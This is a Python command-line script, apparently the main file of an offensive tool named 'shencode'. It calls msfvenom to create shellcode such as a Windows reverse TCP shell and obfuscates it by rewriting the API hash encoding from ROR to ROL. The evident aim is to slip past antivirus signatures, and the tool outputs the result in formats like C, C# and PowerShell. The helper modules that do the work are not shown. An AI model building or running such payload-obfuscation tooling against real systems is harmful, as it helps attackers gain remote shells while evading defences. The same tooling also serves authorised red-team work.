import argparse
import os

import utils.assist as assist
import utils.msf as msf
import utils.shellcode as sc

msfvenom_path = "c:\\metasploit-framework\\bin\\msfvenom.bat"
dll_paths = ['C:\\Windows\\System32\\kernel32.dll', 
             'C:\\Windows\\System32\\ws2_32.dll', 
             'C:\\Windows\\System32\\wininet.dll', 
             'C:\\Windows\\System32\\dnsapi.dll',
             'C:\\Windows\\System32\\mswsock.dll']

class nstate:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m[*]\033[0m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m[+]\033[0m'
    WARNING = '\033[93m'
    FAIL = '\033[91m[-]\033[0m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def main(command_line=None):
  print(f"{nstate.HEADER}____ _  _ ____ _  _ ____ ____ ___  ____ {nstate.ENDC}")
  print(f"{nstate.HEADER}[__  |__| |___ |\\ | |    |  | |  \\ |___ {nstate.ENDC}")
  print(f"{nstate.HEADER}___] |  | |___ | \\| |___ |__| |__/ |___{nstate.ENDC}")
  print(f"{nstate.HEADER}Version 0.2 by psycore8{nstate.ENDC}")
  parser = argparse.ArgumentParser(description="create and obfuscate shellcodes")
  parser.add_argument("-o", "--output", choices=["c","casm","cs","ps1","py","hex"], help="formatting the shellcode in C, Casm, C#, Powershell, python or hex")
  subparsers = parser.add_subparsers(dest='command')
  parser_create = subparsers.add_parser("create", help="create a shellcode using msfvenom")
  parser_create.add_argument("-p", "--payload", help="payload to use e.g. windows/shell_reverse_tcp")
  parser_create.add_argument("-lh", "--lhost", help="LHOST Argument")
  parser_create.add_argument("-lp", "--lport", help="LPORT Argument")
  parser_encode = subparsers.add_parser("encode", help="encode windows function hashes to ROL")
  parser_encode.add_argument("-k", "--key", help="ROL key for encoding")
  parser_encode.add_argument("-f", "--filename", help="raw input file with shellcode")
  parser_encode.add_argument("-d", "--decompile", action="store_true", help="decompile modified bytes")
  parser_encode.add_argument("-s", "--showmod",   action="store_true", help="display modifications")
   
  args = parser.parse_args(command_line)
  OutputFormat = args.output
  
  if args.command == "create":
    print(f"{nstate.OKBLUE} create payload")
    cs = msf.msfvenom
    filename = cs.CreateShellcode(msfvenom_path, args.payload, args.lhost, args.lport)

    path = "./"+filename
    cf = os.path.isfile(path)
    if cf == True:
      print(f"{nstate.OKGREEN} shellcode created")
      #os.environ['SHENCODE_FILENAME'] = filename
      #print(f"{nstate.OKBLUE} filename in environment: "+os.environ.get("SHENCODE_FILENAME"))
    else:
      print(f"{nstate.FAIL} shellcode output not found, EXIT")
      exit()
  elif args.command == "encode":
    ror_key = int(args.key)
    if (ror_key < 32) or (ror_key > 255):
     print(f"{nstate.FAIL} Key must be between 33 and 255")
     exit()

    filename = args.filename   
    ror2rol = sc.ror2rol
    ror2rol.process(dll_paths, filename, args.showmod, args.decompile, args.key)
  
  if args.output:
   print(f"{nstate.OKBLUE} processing shellcode format...")
   b2s = assist.bin2sc
   scFormat = b2s.process(filename,OutputFormat)
   print(scFormat)

  print(f"{nstate.OKGREEN} DONE!")

if __name__ == "__main__":
  main()
